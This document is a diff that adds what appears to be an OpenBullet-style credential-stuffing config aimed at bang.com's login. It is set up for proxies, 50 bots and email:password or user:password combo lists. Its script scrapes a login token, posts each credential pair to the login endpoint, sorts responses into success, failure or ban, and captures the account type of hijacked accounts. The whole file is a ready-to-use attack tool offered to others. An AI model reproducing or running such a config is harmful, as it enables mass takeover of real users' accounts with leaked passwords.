@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "Bang.com",
+  "SuggestedBots": 50,
+  "LastModified": "",
+  "AdditionalInfo": "dont leech",
+  "Author": "ur mom",
+  "Version": "420.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Get REQUEST GET "https://www.bang.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "token: '" "'," -> VAR "TOKEN" 
+#Login_Post REQUEST POST "https://www.bang.com/login_check" 
+  CONTENT "{\"_username\":\"<USER>\",\"_password\":\"<PASS>\",\"_remember_me\":true,\"_token\":\"<TOKEN>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"user\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"success\":false" 
+  KEYCHAIN Ban OR 
+    KEY "Access denied" 
+PARSE "<SOURCE>" LR "\u0022type\u0022:\u0022" "\u0022," -> CAP "Account Type" 
+ 
